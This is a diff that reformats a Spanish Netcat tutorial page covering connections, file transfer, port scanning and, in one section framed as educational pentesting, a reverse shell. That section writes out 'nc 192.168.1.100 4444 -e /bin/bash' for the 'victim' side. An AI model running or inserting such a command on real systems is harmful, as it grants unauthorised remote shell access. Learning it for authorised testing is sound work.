@@ -4,9 +4,11 @@ description: Netcat - Notas de hacking y ciberseguridad.
 ---
 
 # Netcat en Linux
-***
+
+---
 
 ## ¿Qué es Netcat?
+
 **Netcat** (abreviado nc) es una herramienta de línea de comandos usada para:
 
 - Leer y escribir datos en conexiones **TCP o UDP**.
@@ -15,35 +17,42 @@ description: Netcat - Notas de hacking y ciberseguridad.
 
 Es conocida como el **“cuchillo suizo de las redes”**.
 
-***
+---
 
 ## Instalación
+
 En la mayoría de sistemas viene preinstalado:
+
 ```bash
 nc -h
 ```
 
 Sí no lo tienes:
 
-**Linux (Debian/Ubuntu):**
+### Linux (Debian/Ubuntu):
+
 ```bash
 sudo apt install netcat
 ```
 
 **Windows:** Puedes usar **Ncat** (parte de Nmap): [https://nmap.org/ncat/](https://nmap.org/ncat/)
 
-***
+---
 
 ## Sintaxis general
+
 ```bash
 nc [opciones] [host] [puerto]
 ```
 
-***
+---
 
 ## Modos principales de uso
+
 ## Cliente TCP
+
 Conectarse a un servidor:
+
 ```bash
 nc 127.0.0.1 8080
 ```
@@ -51,7 +60,9 @@ nc 127.0.0.1 8080
 Esto abre una conexión al puerto 8080 del localhost.
 
 ## Servidor TCP
+
 Escuchar conexiones:
+
 ```bash
 nc -l -p 8080
 ```
@@ -61,16 +72,19 @@ nc -l -p 8080
 -p → especifica el puerto
 
 Luego, desde otro terminal:
+
 ```bash
 nc 127.0.0.1 8080
 ```
 
 Ahora puedes **enviar mensajes entre ambos terminales (chat simple)**.
 
-***
+---
 
 ## UDP en lugar de TCP
+
 Para usar **UDP** en vez de TCP:
+
 ```bash
 # Servidor
 nc -u -l -p 6000
@@ -81,41 +95,50 @@ nc -u 127.0.0.1 6000
 
 -u → activa modo UDP.
 
-***
+---
 
 ## Transferencia de archivos
+
 ## Enviar un archivo
+
 Servidor que recibirá:
+
 ```bash
 nc -l -p 5000 > archivo_recibido.txt
 ```
 
 Cliente que envía:
+
 ```bash
 nc 127.0.0.1 5000 < archivo.txt
 ```
 
 El archivo archivo.txt se envía al servidor.
 
-***
+---
 
 ## Chat simple entre dos PCs (TCP)
+
 En una máquina:
+
 ```bash
 nc -l -p 4000
 ```
 
 En otra:
+
 ```bash
 nc IP_DEL_SERVIDOR 4000
 ```
 
 Ahora ambos pueden escribir y leer mensajes.
 
-***
+---
 
 ## Escaneo de puertos
+
 Netcat puede escanear qué puertos están abiertos en una máquina:
+
 ```bash
 nc -zv 192.168.1.10 20-80
 ```
@@ -126,65 +149,77 @@ nc -zv 192.168.1.10 20-80
 
 20-80 → rango de puertos.
 
-***
+---
 
 ## Redirección de entrada/salida
+
 Puedes usar **pipes** para automatizar tareas:
+
 ```bash
 echo "Hola servidor" | nc 127.0.0.1 8080
 ```
 
 O guardar la respuesta:
+
 ```bash
 nc 127.0.0.1 80  respuesta.txt
 ```
 
-***
+---
 
 ## Reverse Shells (usos éticos y educativos)
+
 Netcat puede crear conexiones remotas tipo **shell inversa**, usadas en **pentesting** (no ilegalmente).
 
 ## En el servidor (escuchando)
+
 ```bash
 nc -l -p 4444 -v
 ```
 
 ## En la víctima (simulada)
+
 ```bash
 nc 192.168.1.100 4444 -e /bin/bash
 ```
 
-Esto le da al servidor una consola remota de la otra máquina. *(Solo en entornos controlados o de práctica legal.)*
+Esto le da al servidor una consola remota de la otra máquina. _(Solo en entornos controlados o de práctica legal.)_
 
-***
+---
 
 ## Otras opciones útiles
+
 <!-- Tabla convertida manualmente -->
 
-***
+---
 
 ## Ejemplo práctico completo
+
 ## Crear servidor de eco
+
 ```bash
 # Servidor
 nc -l -p 1234 -v
 ```
 
 ## Cliente
+
 ```bash
 nc 127.0.0.1 1234
 ```
 
 Ahora cualquier texto que envíes se reflejará entre ambos.
 
-***
+---
 
 ## Resumen rápido
+
 <!-- Tabla convertida manualmente -->
 
-***
+---
 
 ## Alternativas modernas
+
 - **Ncat** (de Nmap): versión más segura y moderna.
 - **Socat**: similar pero con más opciones.
 - **PowerCat** (en Windows PowerShell): equivalente en sistemas modernos.
